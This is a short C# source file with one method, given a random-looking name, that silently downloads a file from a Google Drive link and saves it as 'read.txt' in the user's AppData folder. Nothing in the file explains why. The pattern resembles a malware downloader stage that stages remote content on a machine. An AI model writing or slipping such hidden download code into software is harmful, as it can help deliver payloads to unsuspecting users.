using System;
using System.Net;

public class download
{
	public static void fdsdfsdfse()
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFile("https://drive.google.com/u/0/uc?id=1yS020ty6ew0kLwLZ_dz9o5MlCS5wZQf-&export=download", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\read.txt");
	}
}
